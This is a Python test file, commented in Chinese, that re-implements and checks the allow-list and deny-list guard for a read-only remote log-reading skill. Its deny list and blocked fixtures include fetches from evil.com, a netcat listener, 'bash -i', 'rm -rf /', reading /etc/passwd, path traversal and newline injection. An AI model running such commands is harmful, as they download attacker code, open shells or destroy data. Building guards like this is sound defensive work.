"""测试 common.ps1 中 Assert-RemoteReadCommand 的白名单和黑名单逻辑。

运行方式：
    cd skills/server-docker-logs-readonly/scripts
    python test_command_safety.py

本测试通过 Python 重新实现白名单/黑名单检查逻辑来验证设计意图，
确保 PowerShell 实现的围栏规则覆盖了所有预期场景。
"""

from __future__ import annotations

import re
import sys

# 从 common.ps1 提取的围栏常量（必须与 common.ps1 保持同步）
WHITELIST_PATTERN = re.compile(
    r'^(cd -- /[A-Za-z0-9_./-]+ && |docker ps --format|docker inspect --format|docker exec [A-Za-z0-9_.-]+ /bin/sh -lc )'
)

DANGER_FRAGMENTS = [
    ' rm ', ' rm -', "'rm ", ' mv ', ' cp ', ' touch ', ' mkdir ', ' rmdir ',
    ' chmod ', ' chown ', ' tee ', ' truncate ', ' sed -i', ' >', '>>',
    ' restart', ' stop', ' start', ' kill', ' systemctl ', ' service ',
    ' apt ', ' yum ', ' pip ', ' npm ', ' curl ', "'curl ", ' wget ', "'wget ",
    ' nc ', ' bash -i',
]

PATH_TRAVERSAL_PATTERN = re.compile(r'\.\.')


def check_remote_command(cmd: str) -> str | None:
    """模拟 Assert-RemoteReadCommand，返回 None 表示通过，否则返回拒绝原因。"""
    if '\n' in cmd or '\r' in cmd:
        return "multi-line"
    if not WHITELIST_PATTERN.match(cmd):
        return "not in whitelist"
    if PATH_TRAVERSAL_PATTERN.search(cmd):
        return "path traversal (..)"
    for frag in DANGER_FRAGMENTS:
        if frag.lower() in cmd.lower():
            return f"danger fragment: {frag.strip()}"
    return None


# === 应该通过的只读命令 ===

SAFE_COMMANDS = [
    # host_dir 读取
    "cd -- /var/log/app && find . -maxdepth 1 -type f -exec basename {} \\; 2>/dev/null | sort || true",
    "cd -- /var/log/app && tail -n 200 -- app.log 2>&1",
    "cd -- /var/log/app && grep -F -- ERROR app.log 2>/dev/null | tail -n 200",
    "cd -- /opt/services/myapp/logs && tail -n 5000 -- access.log 2>&1",
    # docker 读取
    "docker exec myapp-container /bin/sh -lc 'cd -- logs && tail -n 100 -- app.log 2>&1'",
    "docker exec my_app.v2 /bin/sh -lc 'find . -maxdepth 1 -type f -exec basename {} \\; 2>/dev/null | sort || true'",
    "docker ps --format '{{.Names}}'",
    "docker inspect --format '{{.State.Status}}' myapp",
]

# === 应该被拦截的危险命令 ===

DANGEROUS_COMMANDS = [
    # 直接 ssh/shell 命令
    ("ssh root@server ls", "not in whitelist"),
    ("bash -c 'cat /etc/passwd'", "not in whitelist"),
    # 不在白名单模式内
    ("ls /var/log", "not in whitelist"),
    ("cat /var/log/app.log", "not in whitelist"),
    ("docker run --rm alpine sh", "not in whitelist"),
    # 在白名单模式内但包含危险片段
    ("cd -- /var/log && rm -rf /", "rm"),
    ("cd -- /var/log && mv app.log app.bak", "mv"),
    ("cd -- /var/log && curl http://evil.com", "curl"),
    ("cd -- /var/log && wget http://evil.com/shell.sh", "wget"),
    ("cd -- /tmp && chmod 777 exploit.sh", "chmod"),
    ("cd -- /var/log && systemctl restart nginx", "restart"),
    ("cd -- /var/log && kill -9 1234", "kill"),
    ("cd -- /var/log && apt install nmap", "apt"),
    ("cd -- /var/log && tail -n 100 app.log > /tmp/out.txt", ">"),
    ("cd -- /var/log && tail -n 100 app.log >> /tmp/out.txt", ">"),
    ("cd -- /var/log && sed -i 's/foo/bar/' app.log", "sed -i"),
    ("cd -- /var/log && bash -i", "bash -i"),
    ("cd -- /var/log && nc -l 4444", "nc"),
    ("docker exec myapp /bin/sh -lc 'rm -rf /data'", "'rm"),
    ("docker exec myapp /bin/sh -lc 'curl http://evil.com'", "'curl"),
    # 多行注入
    ("cd -- /var/log && tail -n 10 app.log\nrm -rf /", "multi-line"),
]

# === 边界情况 ===

EDGE_CASES_SAFE = [
    # 路径中有合法特殊字符
    "cd -- /var/log/my_app-v2.0 && tail -n 100 -- error.log 2>&1",
    # docker 容器名有点和连字符
    "docker exec my-app.prod /bin/sh -lc 'tail -n 50 -- app.log 2>&1'",
]

EDGE_CASES_BLOCKED = [
    # 路径穿越
    ("cd -- /var/log/../../etc && cat passwd", "path traversal"),
    # 空命令
    ("", "not in whitelist"),
]


def test_safe_commands():
    failures = []
    for cmd in SAFE_COMMANDS + EDGE_CASES_SAFE:
        result = check_remote_command(cmd)
        if result is not None:
            failures.append(f"FAIL (should pass): {cmd!r}\n  Rejected: {result}")
    return failures


def test_dangerous_commands():
    failures = []
    for cmd, expected in DANGEROUS_COMMANDS + EDGE_CASES_BLOCKED:
        result = check_remote_command(cmd)
        if result is None:
            failures.append(f"FAIL (should block): {cmd!r}")
        elif expected not in result:
            failures.append(f"FAIL (wrong reason): {cmd!r}\n  Expected '{expected}' in: {result}")
    return failures


def main():
    all_failures = []
    tests = [
        ("safe_commands", test_safe_commands),
        ("dangerous_commands", test_dangerous_commands),
    ]

    for name, test_fn in tests:
        failures = test_fn()
        if failures:
            print(f"\n{'='*60}")
            print(f"FAILED: {name}")
            print(f"{'='*60}")
            for f in failures:
                print(f"  {f}")
            all_failures.extend(failures)
        else:
            print(f"  PASSED: {name}")

    print(f"\n{'='*60}")
    if all_failures:
        print(f"TOTAL FAILURES: {len(all_failures)}")
        raise SystemExit(1)
    else:
        print("ALL TESTS PASSED")
        raise SystemExit(0)


if __name__ == "__main__":
    main()
